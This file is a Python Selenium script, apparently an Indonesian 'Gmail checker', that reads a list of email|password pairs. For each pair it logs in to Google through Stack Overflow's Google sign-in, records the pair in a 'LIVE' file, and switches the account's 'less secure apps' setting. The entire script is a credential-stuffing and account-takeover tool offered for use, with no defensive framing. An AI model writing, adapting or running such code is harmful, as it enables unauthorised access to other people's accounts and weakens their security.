#2k20
#Converted from js (wibuheker on github) to py 
#Email|Password

from selenium import webdriver
import time, os
from selenium.webdriver.common.keys import Keys
from colorama import Fore, Back, Style


#INTRO
os.system("clear")
print(Fore.GREEN + """ 
----------------------------------
____ ____ ___ ____ _  _ _ ____ 
|__| |__/  |  |___ |\/| | [__  
|  | |  \  |  |___ |  | | ___] 
                             
----------------------------------
____ _  _ ____ ____ _  _ ____ ____ 
|    |__| |___ |    |_/  |___ |__/ 
|___ |  | |___ |___ | \_ |___ |  \ 

----------------------------------
""")

print("""CODED WITH <3 BY RZYZ
Supported by Andreaz ID 
Less Secure WITH Selenium V 1.0.0
""")
time.sleep(3)	
os.system("clear")

list = input('ayo sinikan empassnya xixi : ')
list = open(list, 'r')
print("-"*50)
while True:
	email = list.readline().replace('\n','')
	if not email:
		print("liat ajg mana listnya mek")
		break
	aww = email.strip().split('|')
	driver = webdriver.Chrome()
	driver.get("https://stackoverflow.com/users/signup?ssrc=head&returnurl=%2fusers%2fstory%2fcurrent")
	time.sleep(5)
	loginform = driver.find_element_by_xpath("//button[@data-provider='google']")
	loginform.click()
	mailform = driver.find_element_by_id('identifierId')
	mailform.send_keys(aww[0])
	driver.find_element_by_xpath("//div[@id='identifierNext']").click()
	time.sleep(3)
	passform = driver.find_element_by_css_selector("input[type='password']")
	passform.send_keys(aww[1])
	driver.find_element_by_id('passwordNext').click()
	time.sleep(3)
	driver.get("https://myaccount.google.com/lesssecureapps?pli=1")
	open('LIVE.txt', 'a+').write(f"CHECKED : {aww[0]}|{aww[1]}")
	time.sleep(3)
	lessoff = driver.find_element_by_xpath('//div[@class="hyMrOd "]/div/div/div//div[@class="N9Ni5"]').click()
	driver.delete_all_cookies()
	driver.close()
print("UDAH DONG XIXIXIIX")
